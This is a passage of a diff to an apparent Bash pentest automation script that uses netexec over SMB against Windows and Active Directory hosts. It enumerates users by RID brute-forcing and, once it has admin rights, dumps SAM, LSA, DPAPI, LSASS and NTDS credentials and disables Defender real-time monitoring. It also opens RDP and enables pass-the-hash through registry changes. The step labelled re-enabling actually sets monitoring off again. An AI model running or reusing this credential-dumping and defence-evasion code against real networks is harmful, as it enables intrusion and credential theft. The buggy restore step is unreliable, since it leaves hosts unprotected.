+					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
+							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
+							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
+							column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt
+					
+					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
+					
+					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
+							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
+							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
+							column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt				
+					
+					## Supprimer les doublons
+					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
+					sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
+					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
+							awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
+					echo $check_smb
+					if [[ "$check_smb" -gt 0 ]]; then
+						green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
+					fi
+				fi
+				# Can i connect with input user ?
+				if [[ "$Username" != "anonymous" ]]; then
+					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_$Username 2>/dev/null
+					if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic_$Username" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic_$Username"; then
+						#If NTLM is not supported, restart with kerberos
+						if [[ -n "$hostname" ]];then
+							kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
+							host="$(echo $hostname | cut -d '.' -f 1)"
+						fi
+						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_$Username 2>/dev/null
+					else
+						kerberos=""
+						host="${ip}"
+					fi
+				fi
+				#Can we connect to at least one share ?
+				if grep -aqs '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username || grep -aqs '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest || grep -aqs 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
+					if [[ "$Username" != "anonymous" ]]; then
+						green_log "${SPACE}${SPACE}[💀] $Username is a valid username"
+					fi
+					can_connect="1"
+				else
+					can_connect="0"
+				fi
+				#Are we machine's admin
+				if grep -aqs '(Pwn3d!)' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username; then
+					red_log "${SPACE}${SPACE}[💀] $Username have admin rights ! -> impacket-smbexec to exploit"
+					admin="1"
+				else
+					admin="0"
 				fi
 				
-				if [ "$admin" = "1" ]; then
-					###### DUMP SAM ######
-					$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos --sam < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_sam 2>/dev/null
-					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_sam | wc -l)
-					
-					if [ "$check_smb" -gt 1 ]; then
-						green_log "${SPACE}${SPACE}[💀] Success dump SAM -> ${DIR_VULNS}/smb/cme_${ip}_sam"
-					fi
-					
-					###### DUMP LSA ######
-					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --lsa < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsa 2>/dev/null
-					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsa | wc -l)
-					
-					if [ "$check_smb" -gt 1 ]; then
-						green_log "${SPACE}${SPACE}[💀] Success dump LSA -> ${DIR_VULNS}/smb/cme_${ip}_lsa"
-					fi
-					
-					###### DUMP DPAPI ######
-					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --dpapi < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_dpapi 2>/dev/null
-					check_smb=$(grep -oa 'Looting secrets' ${DIR_VULNS}/smb/cme_${ip}_dpapi | wc -l)
-
-					if [ "$check_smb" -gt 0 ] && ! grep -q "No secrets found" ${DIR_VULNS}/smb/cme_${ip}_dpapi; then
-						green_log "${SPACE}${SPACE}[💀] Success dump DPAPI -> ${DIR_VULNS}/smb/cme_${ip}_dpapi"
-					fi
-					##### IMPERSONATE #####
-					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_impersonate 2>/dev/null
-					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_impersonate | wc -l)
-					
-					if [ "$check_smb" -gt 1 ]; then
-						green_log "${SPACE}${SPACE}[💀] Success impersonnate -> ${DIR_VULNS}/smb/cme_${ip}_impersonate"
-						blue_log "${SPACE}${SPACE} [+] Possibility to exploit via : $proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate -o TOKEN=1 EXEC='whoami'"
-					fi
-					
-					###### COMMAND EXECUTION ######
-					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x "whoami" < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd 2>/dev/null
-					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_cmd | wc -l)
-					
-					if [ "$check_smb" -gt 1 ]; then
-						green_log "${SPACE}${SPACE}[💀] Success command execution"
-						
-						#Disabling RealTimeMonitoring
-						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null > /dev/null 2>/dev/null
-						
-						#### Extract LSSAS only on VM that are not DC - to avoid possible crash ..
-						if [ $(cat $DIR_PORTS/88.txt | grep -aqi "$ip"; echo $?) -eq 1 ]; then
-							###### DUMP LSASS ######
-							$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M lsassy < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsass 2>/dev/null
-							check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsass | wc -l)
-
-							if [[ "$check_smb" -gt 0 ]] && ! grep -q "No credentials found" "${DIR_VULNS}/smb/cme_${ip}_lsass"; then
-								green_log "${SPACE}${SPACE}[💀] Success dump LSASS.EXE -> ${DIR_VULNS}/smb/cme_${ip}_lsass"
+				if [ "$can_connect" = "1" ]; then
+					#List available shares
+					# Do not do it again if it's anonymous user. It is do at the SMB check beginning
+					if [ "$Username" != "anonymous" ]; then
+						$proxychains netexec smb -u "$Username" $cme_creds --shares < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username 2>/dev/null
+						if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username"; then
+							green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_basic_share_$Username"
+							if [[ -n "$Password" ]]; then
+								blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
+							elif [[ -n "$NT_Hash" ]]; then
+								blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
 							fi
-						else
-							##### NTDS extract #####
-							$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --ntds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_ntds 2>/dev/null
-							check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_ntds | wc -l)
+						fi
+					fi
+					
+					###### RETRIEVE POLICY PASSWORD ######
+					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --pass-pol < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_pass_pol 2>/dev/null
+					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_pass_pol | wc -l)
+					if [ "$check_smb" -gt 1 ]; then
+						green_log "${SPACE}${SPACE}[💀] Password Policy found -> ${DIR_VULNS}/smb/cme_${ip}_pass_pol"
+					fi
+					
+					###### RETRIEVE USERS ######
+						#'< /dev/null' avoid netexec to break the loop, weird behavior ..
+					$proxychains netexec --timeout $CME_TIMEOUT smb $host $cme_creds $kerberos --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_rid_brute 2>/dev/null
+					cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute |grep -i 'SidTypeUser'| grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
+					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | wc -l)
+					if grep -qs "SidTypeUser" "$check_smb"; then
+						green_log "${SPACE}${SPACE}[💀] New users found (via RID_brute) -> ${DIR_VULNS}/smb/cme_${ip}_rid_brute"
+						## Supprimer les doublons
+						sort -u ${DIR}/users.txt -o ${DIR}/users.txt
+					fi
+					
+					$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_users 2>/dev/null
+					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_users | wc -l)
+					if [[ "$check_smb" -gt 4 ]]; then
+						green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
+									
+						## Injecter ces utilisateurs dans un fichier
+						cat ${DIR_VULNS}/smb/cme_${ip}_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
+								sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
+								awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
+								column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+						cat ${DIR_VULNS}/smb/cme_${ip}_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+								sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt
+						## Supprimer les doublons
+						sort -u ${DIR}/users.txt -o ${DIR}/users.txt
+						sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
+					fi
+					
+					if [ "$admin" = "1" ]; then
+						###### DUMP SAM ######
+						$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos --sam < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_sam 2>/dev/null
+						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_sam | wc -l)
+						
+						if [ "$check_smb" -gt 1 ]; then
+							green_log "${SPACE}${SPACE}[💀] Success dump SAM -> ${DIR_VULNS}/smb/cme_${ip}_sam"
+						fi
+						
+						###### DUMP LSA ######
+						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --lsa < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsa 2>/dev/null
+						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsa | wc -l)
+						
+						if [ "$check_smb" -gt 1 ]; then
+							green_log "${SPACE}${SPACE}[💀] Success dump LSA -> ${DIR_VULNS}/smb/cme_${ip}_lsa"
+						fi
+						
+						###### DUMP DPAPI ######
+						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --dpapi < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_dpapi 2>/dev/null
+						check_smb=$(grep -oa 'Looting secrets' ${DIR_VULNS}/smb/cme_${ip}_dpapi | wc -l)
+
+						if [ "$check_smb" -gt 0 ] && ! grep -q "No secrets found" ${DIR_VULNS}/smb/cme_${ip}_dpapi; then
+							green_log "${SPACE}${SPACE}[💀] Success dump DPAPI -> ${DIR_VULNS}/smb/cme_${ip}_dpapi"
+						fi
+						##### IMPERSONATE #####
+						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_impersonate 2>/dev/null
+						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_impersonate | wc -l)
+						
+						if [ "$check_smb" -gt 1 ]; then
+							green_log "${SPACE}${SPACE}[💀] Success impersonnate -> ${DIR_VULNS}/smb/cme_${ip}_impersonate"
+							blue_log "${SPACE}${SPACE} [+] Possibility to exploit via : $proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate -o TOKEN=1 EXEC='whoami'"
+						fi
+						
+						###### COMMAND EXECUTION ######
+						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x "whoami" < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd 2>/dev/null
+						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_cmd | wc -l)
+						
+						if [ "$check_smb" -gt 1 ]; then
+							green_log "${SPACE}${SPACE}[💀] Success command execution"
 							
-							if [ "$check_smb" -gt 1 ]; then
-								green_log "${SPACE}${SPACE}[💀] Success dump NTDS -> ${DIR_VULNS}/smb/cme_${ip}_ntds"
-							fi
-						fi
-						
-						#Check for disconnected RDP sessions
-						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'query user' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp 2>/dev/null
-						check_smb=$(grep -aEi 'Déco|Deco|Dis' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp | wc -l)
-						if [ "$check_smb" -gt 0 ]; then
-							green_log "${SPACE}${SPACE}[💀] Found RDP session disconnected -> ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp"
-						fi
-						#If RDP is not enabled
-						if ! grep -q "$ip" $DIR_PORTS/3389.txt;then 
-							#Enable RDP in registry
-							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
-							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'"
-							echo "${DIR_VULNS}/smb/cme_${ip}_enabling_rdp"
-							#Allow RDP connexion on the machine
-							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
-							actual_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes'"
-							future_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=No'"
-							if ! grep -i 'Ok.' ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp; then
-								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group="Bureau à distance" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
-								#overwrite the $actual_modification and $future_modification variables if necessary
-								actual_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"Bureau à distance\" new enable=Yes'"
-								future_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"Bureau à distance\" new enable=No'"
-							fi
-							#Restart RDP service on the machine
-							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Restart-Service -Force -Name "TermService"' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
-							#Check the RDP service
-							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name "TermService"' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp 2>/dev/null
-							if grep -qi 'Running' ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp;then
-								orange_log "${SPACE}${SPACE}[💀] RDP is now activate (it wasn't) on $host (${ip}) -> Changement added in $DIR/modifs.txt"
-								 echo -e "\nACTION : Enabling RDP on $host (${ip}" >> $DIR/modifs.txt
-								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'" >> $DIR/modifs.txt
-								 echo "$actual_modification" >> $DIR/modifs.txt
-								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Restart-Service -Force -Name \"TermService\"'" >> $DIR/modifs.txt
-								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name \"TermService\"'" >> $DIR/modifs.txt
-								 echo "CORRECTION ->" >> $DIR/modifs.txt
-								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
-								 echo "$future_modification" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
-								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Stop-Service -Force -Name \"TermService\"'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
-								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name \"TermService\"'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
-								 echo "$ip" >> $DIR_PORTS/3389.txt
+							#Disabling RealTimeMonitoring
+							$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null > /dev/null 2>/dev/null
+							
+							#### Extract LSSAS only on VM that are not DC - to avoid possible crash ..
+							if [ $(cat $DIR_PORTS/88.txt | grep -aqi "$ip"; echo $?) -eq 1 ]; then
+								###### DUMP LSASS ######
+								$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M lsassy < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsass 2>/dev/null
+								check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsass | wc -l)
+
+								if [[ "$check_smb" -gt 0 ]] && ! grep -q "No credentials found" "${DIR_VULNS}/smb/cme_${ip}_lsass"; then
+									green_log "${SPACE}${SPACE}[💀] Success dump LSASS.EXE -> ${DIR_VULNS}/smb/cme_${ip}_lsass"
+								fi
 							else
-								rm ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp
+								##### NTDS extract #####
+								$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --ntds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_ntds 2>/dev/null
+								check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_ntds | wc -l)
+								
+								if [ "$check_smb" -gt 1 ]; then
+									green_log "${SPACE}${SPACE}[💀] Success dump NTDS -> ${DIR_VULNS}/smb/cme_${ip}_ntds"
+								fi
 							fi
+							
+							#Check for disconnected RDP sessions
+							$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'query user' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp 2>/dev/null
+							check_smb=$(grep -aEi 'Déco|Deco|Dis' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp | wc -l)
+							if [ "$check_smb" -gt 0 ]; then
+								green_log "${SPACE}${SPACE}[💀] Found RDP session disconnected -> ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp"
+							fi
+							#If RDP is not enabled
+							if ! grep -q "$ip" $DIR_PORTS/3389.txt;then 
+								#Enable RDP in registry
+								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
+								echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'"
+								echo "${DIR_VULNS}/smb/cme_${ip}_enabling_rdp"
+								#Allow RDP connexion on the machine
+								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
+								actual_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes'"
+								future_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=No'"
+								if ! grep -i 'Ok.' ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp; then
+									$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group="Bureau à distance" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
+									#overwrite the $actual_modification and $future_modification variables if necessary
+									actual_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"Bureau à distance\" new enable=Yes'"
+									future_modification="$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'netsh advfirewall firewall set rule group=\"Bureau à distance\" new enable=No'"
+								fi
+								#Restart RDP service on the machine
+								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Restart-Service -Force -Name "TermService"' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
+								#Check the RDP service
+								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name "TermService"' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp 2>/dev/null
+								if grep -qi 'Running' ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp;then
+									orange_log "${SPACE}${SPACE}[💀] RDP is now activate (it wasn't) on $host (${ip}) -> Changement added in $DIR/modifs.txt"
+									 echo -e "\nACTION : Enabling RDP on $host (${ip}" >> $DIR/modifs.txt
+									 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'" >> $DIR/modifs.txt
+									 echo "$actual_modification" >> $DIR/modifs.txt
+									 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Restart-Service -Force -Name \"TermService\"'" >> $DIR/modifs.txt
+									 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name \"TermService\"'" >> $DIR/modifs.txt
+									 echo "CORRECTION ->" >> $DIR/modifs.txt
+									 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
+									 echo "$future_modification" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
+									 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Stop-Service -Force -Name \"TermService\"'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
+									 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name \"TermService\"'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
+									 echo "$ip" >> $DIR_PORTS/3389.txt
+								else
+									rm ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp
+								fi
+							fi
+							###### RESTRICTED ADMIN #####
+							# Will permit to connect with NTLM Hash
+							$proxychains timeout $CME_TIMEOUT netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
+							
+							check_smb=$(grep -aEi '0x0' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted | wc -l)
+							if [ "$check_smb" -gt 0 ]; then
+								red_log "${SPACE}[!] Pass-The-Hash already allowed for RDP ! -> Possible old compromission"
+								rm ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted
+							else
+								$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f'  < /dev/null ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
+								orange_log "${SPACE}${SPACE}[💀] New possibility to Pass-The-Hash enabled on RDP -> Changement added in $DIR/modifs.txt"
+								echo -e "\nACTION :" >> $DIR/modifs.txt
+								echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'" >> $DIR/modifs.txt
+								echo "CORRECTION ->" >> $DIR/modifs.txt
+								echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f'" | tee -a $DIR/modifs.txt $DIR/modifs_automation.txt > /dev/null
+							fi
+							
+							#Re-enabling RealTimeMonitoring
+							$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null
+							
 						fi
-						###### RESTRICTED ADMIN #####
-						# Will permit to connect with NTLM Hash
-						$proxychains timeout $CME_TIMEOUT netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
-						
-						check_smb=$(grep -aEi '0x0' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted | wc -l)
-						if [ "$check_smb" -gt 0 ]; then
-							red_log "${SPACE}[!] Pass-The-Hash already allowed for RDP ! -> Possible old compromission"
-							rm ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted
-						else
-							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f'  < /dev/null ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
-							orange_log "${SPACE}${SPACE}[💀] New possibility to Pass-The-Hash enabled on RDP -> Changement added in $DIR/modifs.txt"
-							echo -e "\nACTION :" >> $DIR/modifs.txt
-							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'" >> $DIR/modifs.txt
-							echo "CORRECTION ->" >> $DIR/modifs.txt
